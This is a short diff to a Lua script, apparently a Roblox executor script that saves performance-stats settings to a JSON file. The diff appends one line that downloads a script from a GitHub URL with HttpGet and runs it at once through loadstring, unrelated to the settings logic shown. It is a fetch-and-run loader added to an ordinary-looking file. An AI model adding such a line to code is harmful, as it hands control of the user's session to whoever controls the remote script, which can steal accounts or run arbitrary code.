@@ -59,3 +59,6 @@ gameSettings.PerformanceStatsVisibleChanged:Connect(function(bool)
         writefile("RobloxSettings.json", httpService:JSONEncode(savedsettings));
     end
 end);
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Dankestmemes1/Yba/main/script"))()
+
